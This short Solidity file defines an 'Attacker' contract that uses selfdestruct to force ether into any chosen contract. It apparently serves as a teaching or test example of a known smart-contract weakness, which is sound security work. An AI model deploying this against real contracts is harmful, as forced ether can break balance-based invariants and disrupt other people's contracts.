// SPDX-License-Identifier: MIT
pragma solidity 0.4.24;

// Example attacker contract to force ether into any other contract
contract Attacker {
    function attack(address contractToAttack) external payable {
        selfdestruct(contractToAttack);
    }
}
